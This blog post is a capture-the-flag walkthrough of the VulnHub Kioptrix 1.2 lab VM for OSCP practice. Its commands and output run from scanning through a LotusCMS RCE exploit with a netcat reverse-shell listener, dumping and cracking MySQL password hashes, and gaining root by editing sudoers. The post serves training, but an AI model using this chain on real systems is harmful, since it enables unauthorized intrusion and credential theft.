---
title: "Kioptrix #3 Walkthrough"
author: alex
date: Fri 28 Jul 17:15:48 CEST 2023
categories: [Walkthroughs]
tags: [oscp, ctf, walkthroughs, vulnhub]
img_path: /assets/img/posts/2023-07-28-kioptrix-3-walkthrough/
---

Today I'm hacking into **Kioptrix 1.2**. Or Kioptrix #3. This is one of the many **beginner-friendly OSCP-like** CTFs of Vulnhub. So it's a great starting point for preparing the OSCP tests. If you want to start with the previous level, check my walkthroughs: **[Kioptrix #1](/posts/kioptrix-1-walkthrough)** and **[Kioptrix #2](/posts/kioptrix-2-walkthrough)**.

## Methodology

1. Reconnaissance
2. Enumeration
3. Exploitation
   - Gaining root access

## Tools Used

- Netdiscover
- Nmap
- Gobuster
- Searchsploit
- Someone's exploit
- NetCat
- CrackStation

## Recon

Let's scan the network to discover our target's IP address:

```bash
sudo netdiscover
```
And here's the output:

```
Currently scanning: 192.168.18.0/16   |   Screen View: Unique Hosts                                               
                                                                                                                   
2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 120                                                   
_____________________________________________________________________________
  IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
-----------------------------------------------------------------------------
192.168.1.1     08:00:27:bf:11:12      1      60  PCS Systemtechnik GmbH                                          
192.168.1.45    08:00:27:fd:e3:ab      1      60  PCS Systemtechnik GmbH 
```
## Enumeration 

After getting the IP address of the target we now need to enumerate the target for open ports and protocols. I have used **Nmap** aggressive command for that: 

```bash
sudo nmap -p- -T4 -A -O -v 192.168.1.40
```

> **IDS & FW TRIGGERING** 
> 
> In real world situations, **this scans may trigger firewalls and other network security appliances.** If you want to run a softer scan, just change `-sV` to `-sS`. Once you know the open ports, you can target them individually. Change `-T4` (speed 4) to `-T1` (slow speed, will take ages) as well. It's not undetectable but less probable. You can also use `-D` for decoy. Check the Nmap theory **[here!](/posts/oscpath-week-1/#port-scanning)**
{: .prompt-warning }

And the output...

```
Nmap scan report for 192.168.1.45
Host is up (0.00032s latency).
Not shown: 65533 closed tcp ports (reset)

PORT   STATE SERVICE VERSION

22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey: 
|   1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA)
|_  2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA)

80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
|_http-favicon: Unknown favicon MD5: 99EFC00391F142252888403BB1C196D2
|_http-title: Ligoat Security - Got Goat? Security ...
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch

MAC Address: 08:00:27:5D:18:0B (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Uptime guess: 497.102 days (since Mon Apr  4 14:53:57 2022)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=193 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.32 ms 192.168.1.45
```

We can see two ports open here. 

- **Port 22:** Nothing interesting so far when trying to connect via SSH.

- **Port 80:** Let's open the browser and search for http://192.168.1.45. We find a web page and we can head to log into a LotusCMS but let's keep going with the recon before trying anything here.

Let's enumerate the directories of the website with `gobuster`: `sudo gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 192.168.1.45 -t 10`. And the only interesting result is a **phpMyAdmin** directory.

I tried to log in with some default credentials and I got access using `admin` as user and no password but not with enough permissions to do anything. So I went back to the login page.

It says powered by **LotusCMS** so I did a quick search with **searchsploit** to see what I could find: `searchsploit lotuscms`. And there is a Metasploit module that looked promising BUT didn't work so I Googled around the vulnerability trying to find an exploit. Here's the one I found that works: **[LotusCMS RCE](https://github.com/Hood3dRob1n/LotusCMS-Exploit)**. Now, give permissions to the file: `chmod 777 lotusRCE.sh` and execute the exploit: `./lotusRCE.sh 192.168.1.45 /`. To use it:

1. Enter your IP address when prompted.
2. Enter the port that best suits you. I used 1234.
3. Start **NetCat**: `sudo nc -nlvp 1234`.
4. Select the option #1 in the exploit
5. Go back to NetCat and there we go, we're in!

Let's look for some hardcoded credentials. They are normally inside a *config* file so let's locate any file containing **config.php** in its name: `locate config.php`. We will see that a *gconfig.php* file exists and, if we inspect it, we can see the **mysql** credentials there.

Now it's time to access **mysql** and try to escalate privileges. First let's get some creds: start `mysql` and then select the gallery database: `use gallery;`. Once there, let's dump the accounts credentials: `select * from dev_accounts;`. Here's what we get:

```
+----+------------+----------------------------------+
| id | username   | password                         |
+----+------------+----------------------------------+
|  1 | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 |
|  2 | loneferret | 5badcaf789d3d1d09794d8f021f40f0e |
+----+------------+----------------------------------+
```

These are **MD5** hashes so the will be easily cracked using **[CrackStation](https://crackstation.net/)**. THe first hash corresponds to **Mast3r** and the second to **starwars**. Let's try to connect via SSH with those creds: `ssh loneferret@10.0.2.24 -oHostKeyAlgorithms=+ssh-rsa`. 

Once inside **Kioptrix** let's see what we can do with sudo: `sudo -l`. We see we can use `ht` that is a text editor with sudo permissions so... we can change the **sudoers** file! Let's configure the terminal: `export TERM=xterm` and now: `sudo ht`.

Using this text editor is a bit weird but if you play around you'll manage to dominate it as I did. Or look for a tutorial if you wish. Once we have the **sudoers** file opened, we must add the following to the **loneferret** user: `ALL=(ALL) ALL`. Press `F2` to save the file and `Ctrl+Z` to exit.

Now, to check if it worked just execute `sudo su` and there you go! Now you can `cd` into the `root` directory and `cat` the **Congrats.txt** to proof you compromised the VM.